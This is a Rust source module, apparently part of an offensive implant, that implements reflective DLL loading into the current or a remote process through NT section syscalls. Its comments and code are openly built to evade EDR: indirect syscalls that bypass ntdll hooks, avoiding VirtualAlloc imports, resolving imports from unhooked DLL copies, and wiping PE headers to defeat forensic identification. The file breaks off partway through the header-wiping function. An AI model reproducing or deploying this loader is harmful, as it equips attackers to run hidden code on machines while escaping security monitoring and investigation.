//! Reflective DLL loading via NtCreateSection + NtMapViewOfSection.
//!
//! Loads PE DLLs into the current or a remote process **without** calling
//! `VirtualAlloc`, `VirtualAllocEx`, or `VirtualAllocExNuma` at all.  Instead,
//! the lower-level NT section primitives (`NtCreateSection` and
//! `NtMapViewOfSection`) are used to obtain executable memory.  These NT
//! primitives bypass the Win32 API layer entirely and are harder for EDR to
//! monitor because:
//!
//! 1. **No VirtualAlloc IAT entry** — the agent never imports VirtualAlloc,
//!    so EDR cannot hook or log the allocation.
//! 2. **Section objects are legitimate** — EDR sees a section mapping, not a
//!    raw memory allocation, which is a common pattern for shared memory and
//!    mapped files.
//! 3. **Clean syscall path** — uses indirect syscalls via `do_syscall()`,
//!    bypassing any ntdll hooks.
//!
//! # Architecture
//!
//! ## Phase 1 — Section Mapping (replaces VirtualAlloc)
//! - Parse PE headers from the DLL bytes
//! - Calculate total memory from `SizeOfImage` (page-aligned)
//! - Create a section object via `NtCreateSection` with `SEC_COMMIT`
//! - Map it into the process via `NtMapViewOfSection`
//!
//! ## Phase 2 — PE Image Loading
//! - Copy PE headers and sections to their correct virtual addresses
//! - Process relocations (IMAGE_REL_BASED_DIR64, HIGHLOW, ABSOLUTE, etc.)
//! - Rebuild the IAT using clean-mapped dependency DLLs
//! - Apply per-section memory protections via NtProtectVirtualMemory
//!
//! ## Phase 3 — Execution
//! - Optionally call DllMain with DLL_PROCESS_ATTACH
//! - Optionally wipe PE headers after loading
//!
//! # EDR Evasion Comparison
//!
//! | Aspect                | VirtualAlloc Approach              | NtCreateSection Approach            |
//! |-----------------------|------------------------------------|--------------------------------------|
//! | API Layer             | Win32 (kernel32.dll)               | NT (ntdll.dll, direct syscall)       |
//! | IAT Footprint         | VirtualAlloc import visible         | No VirtualAlloc import at all         |
//! | Hook Surface          | EDR hooks VirtualAlloc universally  | Section APIs less commonly hooked     |
//! | Allocation Pattern    | Raw private memory (suspicious)    | Section-backed mapping (legitimate)  |
//! | Memory Type           | MEM_PRIVATE                        | MEM_MAPPED (or MEM_IMAGE w/ SEC_IMAGE)|
//! | Callback Visibility   | EDR Psapi callbacks fire            | Lower-level, fewer callbacks          |
//!
//! # Constraints
//!
//! - Windows x86_64 only (uses NT syscalls)
//! - Requires `direct-syscalls` feature
//! - Handles both PE32 and PE32+ (64-bit) target images

#![cfg(all(windows, feature = "reflective-loader", target_arch = "x86_64"))]

use std::ffi::c_void;
use std::mem;

use anyhow::{anyhow, bail, Result};
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::ntdef::{HANDLE, PVOID};
use winapi::um::winnt::{
    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT,
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64,
    IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_OPTIONAL_HDR64_MAGIC, IMAGE_NT_SIGNATURE,
    IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH,
    IMAGE_REL_BASED_HIGHADJ, IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_LOW,
    IMAGE_SECTION_HEADER, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
    PAGE_READWRITE, SEC_COMMIT, SECTION_ALL_ACCESS,
};

use crate::syscalls::{do_syscall, get_syscall_id, map_clean_dll, SyscallTarget};

// ── Constants ───────────────────────────────────────────────────────────────

/// DllMain reason: process attach.
const DLL_PROCESS_ATTACH: u32 = 1;
/// DllMain reason: process detach.
const DLL_PROCESS_DETACH: u32 = 0;

/// Page size on x86_64 Windows.
const PAGE_SIZE: usize = 4096;

/// NtCurrentProcess pseudo-handle (-1).
const CURRENT_PROCESS: HANDLE = (-1isize) as *mut c_void;

/// Maximum number of relocations to process before bailing (sanity limit).
const MAX_RELOCATIONS: usize = 1_000_000;

/// Maximum section header count we accept (sanity limit to avoid OOM).
const MAX_SECTIONS: usize = 128;

// ── Configuration ───────────────────────────────────────────────────────────

/// Configuration for reflective DLL loading.
///
/// Controls which phases are performed and what trade-offs are made
/// between stealth and functionality.
#[derive(Debug, Clone)]
pub struct ReflectiveLoadConfig {
    /// If `true`, map the section as executable and write the DLL directly.
    /// If `false`, map as RW, copy the DLL, then flip protections to RX.
    /// Default: `true` (simpler, slightly more detectable if someone checks
    /// for RX mappings; `false` is stealthier but slower).
    pub execute_from_section: bool,

    /// Resolve import address table entries using clean-mapped DLLs.
    /// If `false`, imported functions will be left as null pointers
    /// (DLL will crash if it calls any import).
    pub resolve_imports: bool,

    /// Process the `.reloc` section and apply delta-based fixups.
    /// Required if the DLL is loaded at an address different from its
    /// preferred image base.  Should almost always be `true`.
    pub handle_relocations: bool,

    /// Call the DLL's entry point (DllMain) with `DLL_PROCESS_ATTACH`
    /// after loading.  Set to `false` for libraries that don't need
    /// initialisation or when the caller wants to invoke exports directly.
    pub call_entry_point: bool,

    /// Wipe the first page of PE headers after loading to prevent
    /// forensic tools from identifying the loaded module.  The header
    /// page is set to `PAGE_READONLY` before zeroing to avoid triggering
    /// copy-on-write semantics.
    pub cleanup_headers: bool,
}

impl Default for ReflectiveLoadConfig {
    fn default() -> Self {
        Self {
            execute_from_section: true,
            resolve_imports: true,
            handle_relocations: true,
            call_entry_point: true,
            cleanup_headers: true,
        }
    }
}

// ── Loaded Module ───────────────────────────────────────────────────────────

/// A reflectively loaded module.
///
/// Provides access to the loaded module's base address, size, entry point,
/// and a cleanup function that unmaps and frees the section.
pub struct LoadedModule {
    /// Base address of the loaded image.
    pub base_address: usize,

    /// Total size of the mapped image (page-aligned).
    pub size: usize,

    /// Address of the entry point (DllMain), or 0 if not available.
    pub entry_point: usize,

    /// Module handle that can be used with `pe_resolve` functions.
    pub module_handle: usize,

    /// Cleanup closure: unmaps the section and frees all resources.
    /// Consumed on drop or when explicitly called.
    cleanup_fn: Option<Box<dyn FnOnce()>>,
}

impl LoadedModule {
    /// Returns the base address as a pointer.
    pub fn base_ptr(&self) -> *mut c_void {
        self.base_address as *mut c_void
    }

    /// Manually invoke the cleanup function (unmap section, free resources).
    /// This is also called on drop.
    pub fn cleanup(&mut self) {
        if let Some(cleanup) = self.cleanup_fn.take() {
            cleanup();
        }
    }

    /// Resolve an exported function by name hash.
    ///
    /// Uses the PE export directory to find the function's RVA and adds the
    /// module base.  Handles forwarded exports.
    pub fn get_export(&self, func_name_hash: u32) -> Option<usize> {
        unsafe { pe_resolve::get_proc_address_by_hash(self.base_address, func_name_hash) }
    }

    /// Resolve an exported function by name (convenience wrapper).
    pub fn get_export_by_name(&self, func_name: &str) -> Option<usize> {
        let mut name_bytes = func_name.as_bytes().to_vec();
        name_bytes.push(0);
        let hash = pe_resolve::hash_str(&name_bytes);
        self.get_export(hash)
    }
}

impl Drop for LoadedModule {
    fn drop(&mut self) {
        self.cleanup();
    }
}

// ── Internal helpers ────────────────────────────────────────────────────────

/// Align `value` up to the next multiple of `align`.
fn align_up(value: usize, align: usize) -> usize {
    (value + align - 1) & !(align - 1)
}

/// PE header information extracted from DLL bytes.
struct PeInfo {
    /// Offset of NT headers from base.
    nt_header_offset: usize,
    /// Optional header magic (PE32 = 0x10b, PE32+ = 0x20b).
    magic: u16,
    /// Size of image (from optional header, page-aligned).
    size_of_image: usize,
    /// Preferred image base address.
    image_base: usize,
    /// AddressOfEntryPoint (RVA).
    entry_point_rva: u32,
    /// Number of section headers.
    number_of_sections: u16,
    /// Size of optional header (for finding section table).
    size_of_optional_header: u16,
    /// Export directory RVA and size.
    export_dir: Option<(u32, u32)>,
    /// Import directory RVA and size.
    import_dir: Option<(u32, u32)>,
    /// Base relocation directory RVA and size.
    reloc_dir: Option<(u32, u32)>,
}

/// Parse PE headers from raw bytes and extract key fields.
fn parse_pe_headers(dll_bytes: &[u8]) -> Result<PeInfo> {
    if dll_bytes.len() < mem::size_of::<IMAGE_DOS_HEADER>() {
        bail!("DLL bytes too small for DOS header");
    }

    let dos_header = dll_bytes.as_ptr() as *const IMAGE_DOS_HEADER;
    unsafe {
        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            bail!("Invalid DOS signature: {:#x}", (*dos_header).e_magic);
        }

        let e_lfanew = (*dos_header).e_lfanew as usize;
        if e_lfanew + 4 >= dll_bytes.len() {
            bail!("e_lfanew points beyond DLL bytes");
        }

        // Verify PE signature
        let sig = u32::from_le_bytes(
            dll_bytes[e_lfanew..e_lfanew + 4]
                .try_into()
                .map_err(|_| anyhow!("failed to read PE signature"))?,
        );
        if sig != IMAGE_NT_SIGNATURE {
            bail!("Invalid PE signature: {:#x}", sig);
        }

        // Read file header fields
        let fh_offset = e_lfanew + 4;
        if fh_offset + 20 > dll_bytes.len() {
            bail!("File header extends beyond DLL bytes");
        }
        let number_of_sections =
            u16::from_le_bytes(dll_bytes[fh_offset + 2..fh_offset + 4].try_into().unwrap());
        let size_of_optional_header =
            u16::from_le_bytes(dll_bytes[fh_offset + 16..fh_offset + 18].try_into().unwrap());

        // Read optional header magic
        let opt_offset = fh_offset + 20;
        if opt_offset + 2 > dll_bytes.len() {
            bail!("Optional header extends beyond DLL bytes");
        }
        let magic = u16::from_le_bytes(dll_bytes[opt_offset..opt_offset + 2].try_into().unwrap());

        let (size_of_image, image_base, entry_point_rva) = match magic {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
                if opt_offset + mem::size_of::<IMAGE_NT_HEADERS32>() - 4 > dll_bytes.len() {
                    bail!("PE32 optional header extends beyond DLL bytes");
                }
                let nt32 = (dll_bytes.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS32;
                (
                    (*nt32).OptionalHeader.SizeOfImage as usize,
                    (*nt32).OptionalHeader.ImageBase as usize,
                    (*nt32).OptionalHeader.AddressOfEntryPoint,
                )
            }
            IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
                if opt_offset + mem::size_of::<IMAGE_NT_HEADERS64>() - 4 > dll_bytes.len() {
                    bail!("PE32+ optional header extends beyond DLL bytes");
                }
                let nt64 = (dll_bytes.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
                (
                    (*nt64).OptionalHeader.SizeOfImage as usize,
                    (*nt64).OptionalHeader.ImageBase as usize,
                    (*nt64).OptionalHeader.AddressOfEntryPoint,
                )
            }
            _ => bail!("Unsupported PE optional header magic: {:#x}", magic),
        };

        if number_of_sections > MAX_SECTIONS as u16 {
            bail!("Too many sections: {}", number_of_sections);
        }
        if size_of_image == 0 {
            bail!("SizeOfImage is zero");
        }

        // Extract data directories
        let (export_dir, import_dir, reloc_dir) = match magic {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
                let nt32 = (dll_bytes.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS32;
                let dd = &(*nt32).OptionalHeader.DataDirectory;
                (
                    dir_entry(dd, IMAGE_DIRECTORY_ENTRY_EXPORT as usize),
                    dir_entry(dd, IMAGE_DIRECTORY_ENTRY_IMPORT as usize),
                    dir_entry(dd, IMAGE_DIRECTORY_ENTRY_BASERELOC as usize),
                )
            }
            IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
                let nt64 = (dll_bytes.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
                let dd = &(*nt64).OptionalHeader.DataDirectory;
                (
                    dir_entry(dd, IMAGE_DIRECTORY_ENTRY_EXPORT as usize),
                    dir_entry(dd, IMAGE_DIRECTORY_ENTRY_IMPORT as usize),
                    dir_entry(dd, IMAGE_DIRECTORY_ENTRY_BASERELOC as usize),
                )
            }
            _ => (None, None, None),
        };

        Ok(PeInfo {
            nt_header_offset: e_lfanew,
            magic,
            size_of_image: align_up(size_of_image, PAGE_SIZE),
            image_base,
            entry_point_rva,
            number_of_sections,
            size_of_optional_header,
            export_dir,
            import_dir,
            reloc_dir,
        })
    }
}

/// Extract an optional data directory entry (RVA, Size).
fn dir_entry(
    dd: &[winapi::um::winnt::IMAGE_DATA_DIRECTORY],
    index: usize,
) -> Option<(u32, u32)> {
    dd.get(index)
        .filter(|e| e.VirtualAddress != 0)
        .map(|e| (e.VirtualAddress, e.Size))
}

/// Get a pointer to the section header array from DLL bytes.
fn get_section_headers<'a>(
    dll_bytes: &'a [u8],
    pe: &PeInfo,
) -> Result<&'a [IMAGE_SECTION_HEADER]> {
    let section_offset = pe.nt_header_offset
        + 4 // PE signature
        + mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
        + pe.size_of_optional_header as usize;

    let section_table_size = pe.number_of_sections as usize * mem::size_of::<IMAGE_SECTION_HEADER>();
    if section_offset + section_table_size > dll_bytes.len() {
        bail!("Section table extends beyond DLL bytes");
    }

    let ptr = dll_bytes[section_offset..].as_ptr() as *const IMAGE_SECTION_HEADER;
    Ok(unsafe { std::slice::from_raw_parts(ptr, pe.number_of_sections as usize) })
}

/// Resolve a syscall target, wrapping the error.
fn resolve_syscall(name: &str) -> Result<SyscallTarget> {
    get_syscall_id(name)
        .map_err(|e| anyhow!("failed to resolve SSN for {}: {}", name, e))
}

/// Close an NT handle safely via NtClose.
fn close_nt_handle(handle: HANDLE) {
    if !handle.is_null() {
        unsafe { pe_resolve::close_handle(handle) };
    }
}

// ── NT Syscall Wrappers ─────────────────────────────────────────────────────

/// Create a section object backed by the page file (SEC_COMMIT).
///
/// Returns the section handle on success.  The caller must close it.
unsafe fn nt_create_section(
    maximum_size: usize,
    page_protection: u32,
) -> Result<HANDLE> {
    let sys = resolve_syscall("NtCreateSection")?;
    let mut h_section: HANDLE = std::ptr::null_mut();

    let status = do_syscall(
        sys.ssn,
        sys.gadget_addr,
        &[
            &mut h_section as *mut _ as u64,   // SectionHandle
            SECTION_ALL_ACCESS as u64,          // DesiredAccess
            std::ptr::null_mut::<u64>() as u64, // ObjectAttributes (NULL)
            &(maximum_size as i64) as *const i64 as u64, // MaximumSize
            page_protection as u64,             // SectionPageProtection
            SEC_COMMIT as u64,                  // AllocationAttributes
            std::ptr::null_mut::<u64>() as u64, // FileHandle (NULL = page file)
        ],
    );

    if status != 0 {
        bail!("NtCreateSection failed with status {:#x}", status as u32);
    }
    if h_section.is_null() {
        bail!("NtCreateSection returned null handle");
    }
    Ok(h_section)
}

/// Map a view of a section into the specified process.
///
/// Returns (base_address, view_size) on success.
unsafe fn nt_map_view_of_section(
    h_section: HANDLE,
    process_handle: HANDLE,
    view_size: usize,
    page_protection: u32,
) -> Result<(*mut c_void, SIZE_T)> {
    let sys = resolve_syscall("NtMapViewOfSection")?;
    let mut base_addr: PVOID = std::ptr::null_mut();
    let mut actual_view_size: SIZE_T = view_size;

    let status = do_syscall(
        sys.ssn,
        sys.gadget_addr,
        &[
            h_section as u64,                    // SectionHandle
            process_handle as u64,               // ProcessHandle
            &mut base_addr as *mut _ as u64,     // BaseAddress
            0,                                   // ZeroBits
            0,                                   // CommitSize
            std::ptr::null_mut::<u64>() as u64,  // SectionOffset
            &mut actual_view_size as *mut _ as u64, // ViewSize
            1,                                   // InheritDisposition (ViewShare)
            0,                                   // AllocationType
            page_protection as u64,              // Win32Protect
        ],
    );

    if status != 0 {
        bail!(
            "NtMapViewOfSection failed with status {:#x}",
            status as u32
        );
    }
    if base_addr.is_null() {
        bail!("NtMapViewOfSection returned null base address");
    }
    Ok((base_addr, actual_view_size))
}

/// Unmap a view of a section from the current process.
unsafe fn nt_unmap_view_of_section(base: *mut c_void) -> Result<()> {
    let sys = resolve_syscall("NtUnmapViewOfSection")?;
    let status = do_syscall(
        sys.ssn,
        sys.gadget_addr,
        &[
            CURRENT_PROCESS as u64, // ProcessHandle
            base as u64,            // BaseAddress
        ],
    );
    if status != 0 {
        bail!(
            "NtUnmapViewOfSection failed with status {:#x}",
            status as u32
        );
    }
    Ok(())
}

/// Change memory protection via NtProtectVirtualMemory.
unsafe fn nt_protect_virtual_memory(
    process_handle: HANDLE,
    base: *mut c_void,
    size: usize,
    new_protect: u32,
) -> Result<u32> {
    let sys = resolve_syscall("NtProtectVirtualMemory")?;
    let mut base_ptr = base;
    let mut region_size: SIZE_T = size;
    let mut old_protect: u32 = 0;

    let status = do_syscall(
        sys.ssn,
        sys.gadget_addr,
        &[
            process_handle as u64,            // ProcessHandle
            &mut base_ptr as *mut _ as u64,   // BaseAddress
            &mut region_size as *mut _ as u64, // RegionSize
            new_protect as u64,                // NewProtect
            &mut old_protect as *mut _ as u64, // OldProtect
        ],
    );

    if status != 0 {
        bail!(
            "NtProtectVirtualMemory failed with status {:#x}",
            status as u32
        );
    }
    Ok(old_protect)
}

/// Write data to a remote process via NtWriteVirtualMemory.
unsafe fn nt_write_virtual_memory(
    process_handle: HANDLE,
    base: *mut c_void,
    data: &[u8],
) -> Result<()> {
    let sys = resolve_syscall("NtWriteVirtualMemory")?;
    let mut bytes_written: usize = 0;

    let status = do_syscall(
        sys.ssn,
        sys.gadget_addr,
        &[
            process_handle as u64,                 // ProcessHandle
            base as u64,                            // BaseAddress
            data.as_ptr() as u64,                   // Buffer
            data.len() as u64,                      // NumberOfBytesToWrite
            &mut bytes_written as *mut _ as u64,    // NumberOfBytesWritten
        ],
    );

    if status != 0 {
        bail!(
            "NtWriteVirtualMemory failed with status {:#x}",
            status as u32
        );
    }
    if bytes_written != data.len() {
        bail!(
            "NtWriteVirtualMemory wrote {} of {} bytes",
            bytes_written,
            data.len()
        );
    }
    Ok(())
}

// ── PE Loading Phases ───────────────────────────────────────────────────────

/// Copy PE headers and sections from raw bytes to the mapped memory.
unsafe fn copy_image(base: *mut c_void, dll_bytes: &[u8], pe: &PeInfo) -> Result<()> {
    let base_ptr = base as *mut u8;

    // Copy PE headers (first e_lfanew + sizeof(NT headers) + section headers)
    let headers_size = pe.nt_header_offset
        + 4 // PE sig
        + mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
        + pe.size_of_optional_header as usize
        + pe.number_of_sections as usize * mem::size_of::<IMAGE_SECTION_HEADER>();
    let headers_size = align_up(headers_size, PAGE_SIZE).min(dll_bytes.len());

    std::ptr::copy_nonoverlapping(
        dll_bytes.as_ptr(),
        base_ptr,
        headers_size,
    );

    // Copy each section from its file offset to its virtual address
    let sections = get_section_headers(dll_bytes, pe)?;
    for section in sections {
        let virtual_size = *section.Misc.VirtualSize() as usize;
        let raw_size = section.SizeOfRawData as usize;
        let virtual_address = section.VirtualAddress as usize;
        let raw_offset = section.PointerToRawData as usize;

        if virtual_size == 0 && raw_size == 0 {
            continue;
        }

        let dest = base_ptr.add(virtual_address);

        // Zero the virtual range first (in case VirtualSize > SizeOfRawData)
        let copy_size = raw_size.min(virtual_size);
        std::ptr::write_bytes(dest, 0u8, virtual_size);

        if copy_size > 0 && raw_offset + copy_size <= dll_bytes.len() {
            std::ptr::copy_nonoverlapping(
                dll_bytes.as_ptr().add(raw_offset),
                dest,
                copy_size,
            );
        }
    }

    Ok(())
}

/// Apply delta-based relocations to the loaded image.
///
/// Handles the full `IMAGE_REL_BASED_*` enum:
/// - `DIR64` (64-bit): add delta to the 8-byte value
/// - `HIGHLOW` (32-bit): add delta low 32 bits to the 4-byte value
/// - `HIGH` (16-bit): add delta high 16 bits to the 2-byte value
/// - `LOW` (16-bit): add delta low 16 bits to the 2-byte value
/// - `HIGHADJ` (32-bit): adjust high 16 bits with a signed cookie
/// - `ABSOLUTE`: skip (padding)
unsafe fn apply_relocations(
    base: usize,
    pe: &PeInfo,
    dll_bytes: &[u8],
) -> Result<()> {
    let (reloc_rva, reloc_size) = match pe.reloc_dir {
        Some(r) => r,
        None => return Ok(()), // No relocations needed
    };

    let delta = base as i64 - pe.image_base as i64;
    if delta == 0 {
        return Ok(()); // Loaded at preferred base, no fixups needed
    }

    // Walk the relocation blocks from the *loaded* image (not from dll_bytes)
    // because the image has been fully copied to its virtual addresses.
    let mut offset = 0usize;
    let mut count = 0usize;

    while offset + 8 <= reloc_size as usize && count < MAX_RELOCATIONS {
        let block_base = base + reloc_rva as usize + offset;

        // Read block header from loaded image
        let virtual_address = *(block_base as *const u32);
        let size_of_block = *((block_base + 4) as *const u32);

        if size_of_block == 0 || virtual_address == 0 {
            break;
        }

        // Number of entries = (SizeOfBlock - 8) / 2
        let num_entries = ((size_of_block as usize - 8) / 2).min(MAX_RELOCATIONS);
        let entries_ptr = (block_base + 8) as *const u16;

        for i in 0..num_entries {
            let entry = *entries_ptr.add(i);
            let reloc_type = (entry >> 12) & 0xF;
            let reloc_offset = (entry & 0xFFF) as usize;
            let target_addr = base + virtual_address as usize + reloc_offset;

            match reloc_type {
                IMAGE_REL_BASED_ABSOLUTE => {
                    // Padding, skip
                }
                IMAGE_REL_BASED_HIGH => {
                    // Add high 16 bits of delta to 16-bit value
                    if target_addr + 2 <= base + pe.size_of_image {
                        let val = *(target_addr as *const u16);
                        *(target_addr as *mut u16) =
                            val.wrapping_add((delta >> 16) as u16);
                    }
                }
                IMAGE_REL_BASED_LOW => {
                    // Add low 16 bits of delta to 16-bit value
                    if target_addr + 2 <= base + pe.size_of_image {
                        let val = *(target_addr as *const u16);
                        *(target_addr as *mut u16) =
                            val.wrapping_add(delta as u16);
                    }
                }
                IMAGE_REL_BASED_HIGHLOW => {
                    // Add full 32-bit delta to 32-bit value
                    if target_addr + 4 <= base + pe.size_of_image {
                        let val = *(target_addr as *const u32);
                        *(target_addr as *mut u32) =
                            val.wrapping_add(delta as u32);
                    }
                }
                IMAGE_REL_BASED_HIGHADJ => {
                    // High adjustment: (val + delta_high) + signed_cookie
                    // The next entry is the signed cookie
                    if i + 1 < num_entries {
                        let cookie = *entries_ptr.add(i + 1) as i16;
                        if target_addr + 2 <= base + pe.size_of_image {
                            let val = *(target_addr as *const u16) as i32;
                            let adjusted = val + (delta >> 16) as i32 + cookie as i32;
                            *(target_addr as *mut u16) = adjusted as u16;
                        }
                        // Skip the cookie entry
                        count += 1;
                    }
                }
                IMAGE_REL_BASED_DIR64 => {
                    // Add full 64-bit delta to 8-byte value
                    if target_addr + 8 <= base + pe.size_of_image {
                        let val = *(target_addr as *const u64);
                        *(target_addr as *mut u64) = val.wrapping_add(delta as u64);
                    }
                }
                _ => {
                    // Unknown relocation type — skip (may be platform-specific)
                    log::debug!(
                        "Skipping unknown relocation type {} at RVA {:#x}",
                        reloc_type,
                        virtual_address as usize + reloc_offset,
                    );
                }
            }
            count += 1;
        }

        offset += size_of_block as usize;
    }

    Ok(())
}

/// Rebuild the Import Address Table for the loaded image.
///
/// Walks the import directory, loads each dependency DLL via `map_clean_dll`
/// (clean copies, no IAT hooks), and resolves each imported function by hash.
/// Handles forwarded exports through the pe_resolve infrastructure.
unsafe fn rebuild_iat_reflective(base: usize, pe: &PeInfo) -> Result<()> {
    let (import_rva, _import_size) = match pe.import_dir {
        Some(r) => r,
        None => return Ok(()), // No imports
    };

    let mut import_desc = (base + import_rva as usize) as *const winapi::um::winnt::IMAGE_IMPORT_DESCRIPTOR;

    while (*import_desc).Name != 0 {
        let dll_name_ptr = (base + (*import_desc).Name as usize) as *const i8;
        let dll_name = match std::ffi::CStr::from_ptr(dll_name_ptr).to_str() {
            Ok(s) => s,
            Err(_) => {
                import_desc = import_desc.add(1);
                continue;
            }
        };

        // Load the dependency via clean mapping (no EDR hooks)
        let dep_base = match map_clean_dll(dll_name) {
            Ok(b) => b,
            Err(e) => {
                log::warn!(
                    "reflective_loader: failed to map clean {}: {}, skipping import",
                    dll_name,
                    e
                );
                import_desc = import_desc.add(1);
                continue;
            }
        };

        let original_thunk_rva = if *(*import_desc).u.OriginalFirstThunk() != 0 {
            *(*import_desc).u.OriginalFirstThunk()
        } else {
            (*import_desc).FirstThunk
        };

        match pe.magic {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
                let mut original_thunk = (base + original_thunk_rva as usize)
                    as *const winapi::um::winnt::IMAGE_THUNK_DATA32;
                let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
                    as *mut winapi::um::winnt::IMAGE_THUNK_DATA32;

                while *(*original_thunk).u1.AddressOfData() != 0 {
                    let addr_of_data = *(*original_thunk).u1.AddressOfData();
                    let proc_addr = if (addr_of_data
                        & winapi::um::winnt::IMAGE_ORDINAL_FLAG32)
                        != 0
                    {
                        let ordinal = (addr_of_data & 0xffff) as u32;
                        resolve_export_by_ordinal(dep_base, ordinal)
                    } else {
                        let ibn = (base + addr_of_data as usize)
                            as *const winapi::um::winnt::IMAGE_IMPORT_BY_NAME;
                        let name_ptr = (*ibn).Name.as_ptr();
                        let name_cstr = std::ffi::CStr::from_ptr(name_ptr as *const i8);
                        let hash = pe_resolve::hash_str(name_cstr.to_bytes_with_nul());
                        pe_resolve::get_proc_address_by_hash(dep_base, hash).unwrap_or(0)
                    };

                    if proc_addr != 0 {
                        let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u32;
                        *mut_u1 = proc_addr as u32;
                    }

                    original_thunk = original_thunk.add(1);
                    first_thunk = first_thunk.add(1);
                }
            }
            IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
                let mut original_thunk = (base + original_thunk_rva as usize)
                    as *const winapi::um::winnt::IMAGE_THUNK_DATA64;
                let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
                    as *mut winapi::um::winnt::IMAGE_THUNK_DATA64;

                while *(*original_thunk).u1.AddressOfData() != 0 {
                    let addr_of_data = *(*original_thunk).u1.AddressOfData() as u64;
                    let proc_addr = if (addr_of_data
                        & winapi::um::winnt::IMAGE_ORDINAL_FLAG64)
                        != 0
                    {
                        let ordinal = (addr_of_data & 0xffff) as u32;
                        resolve_export_by_ordinal(dep_base, ordinal)
                    } else {
                        let ibn = (base + addr_of_data as usize)
                            as *const winapi::um::winnt::IMAGE_IMPORT_BY_NAME;
                        let name_ptr = (*ibn).Name.as_ptr();
                        let name_cstr = std::ffi::CStr::from_ptr(name_ptr as *const i8);
                        let hash = pe_resolve::hash_str(name_cstr.to_bytes_with_nul());
                        pe_resolve::get_proc_address_by_hash(dep_base, hash).unwrap_or(0)
                    };

                    if proc_addr != 0 {
                        let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u64;
                        *mut_u1 = proc_addr as u64;
                    }

                    original_thunk = original_thunk.add(1);
                    first_thunk = first_thunk.add(1);
                }
            }
            _ => {}
        }

        import_desc = import_desc.add(1);
    }

    Ok(())
}

/// Resolve an export by ordinal from a clean-mapped DLL.
unsafe fn resolve_export_by_ordinal(base: usize, ordinal: u32) -> usize {
    // Walk the export directory manually
    let dos = base as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return 0;
    }
    let nt_off = (*dos).e_lfanew as usize;
    let opt_off = nt_off + 4 + mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>();
    let magic = *(opt_off as *const u16);

    let export_dir_rva = match magic {
        IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
            let nt32 = (base + nt_off) as *const IMAGE_NT_HEADERS32;
            let dd = &(*nt32).OptionalHeader.DataDirectory;
            dd[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress
        }
        IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
            let nt64 = (base + nt_off) as *const IMAGE_NT_HEADERS64;
            let dd = &(*nt64).OptionalHeader.DataDirectory;
            dd[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress
        }
        _ => return 0,
    };
    if export_dir_rva == 0 {
        return 0;
    }

    let export_dir = (base + export_dir_rva as usize) as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
    let base_ordinal = (*export_dir).Base;
    let num_funcs = (*export_dir).NumberOfFunctions;
    let funcs = (base + (*export_dir).AddressOfFunctions as usize) as *const u32;

    if ordinal < base_ordinal {
        return 0;
    }
    let idx = (ordinal - base_ordinal) as usize;
    if idx >= num_funcs as usize {
        return 0;
    }
    let func_rva = *funcs.add(idx) as usize;
    if func_rva == 0 {
        return 0;
    }
    base + func_rva
}

/// Apply per-section memory protections.
///
/// Sets appropriate protections based on section characteristics:
/// - `.text` (executable) → PAGE_EXECUTE_READ
/// - `.rdata` (read-only data) → PAGE_READONLY
/// - `.data` (read-write data) → PAGE_READWRITE
/// - Headers → PAGE_READONLY
unsafe fn apply_section_protections(
    base: usize,
    pe: &PeInfo,
    dll_bytes: &[u8],
) -> Result<()> {
    // Protect headers as read-only first
    nt_protect_virtual_memory(
        CURRENT_PROCESS,
        base as *mut c_void,
        PAGE_SIZE,
        PAGE_READONLY,
    )?;

    let sections = get_section_headers(dll_bytes, pe)?;
    for section in sections {
        let characteristics = section.Characteristics;
        let virtual_size = *section.Misc.VirtualSize() as usize;
        let virtual_address = section.VirtualAddress as usize;

        if virtual_size == 0 {
            continue;
        }

        let section_base = (base + virtual_address) as *mut c_void;
        let section_size = align_up(virtual_size, PAGE_SIZE);

        let protect = if characteristics & winapi::um::winnt::IMAGE_SCN_MEM_EXECUTE != 0
            && characteristics & winapi::um::winnt::IMAGE_SCN_MEM_WRITE != 0
        {
            PAGE_EXECUTE_READWRITE
        } else if characteristics & winapi::um::winnt::IMAGE_SCN_MEM_EXECUTE != 0 {
            PAGE_EXECUTE_READ
        } else if characteristics & winapi::um::winnt::IMAGE_SCN_MEM_WRITE != 0 {
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        };

        // Ignore protection failures (some sections may not allow changes)
        let _ = nt_protect_virtual_memory(
            CURRENT_PROCESS,
            section_base,
            section_size,
            protect,
        );
    }

    Ok(())
}

/// Wipe the PE headers to prevent forensic identification.
unsafe fn wipe_headers(base: usize) -> Result<()> {
    // Make the header page writable
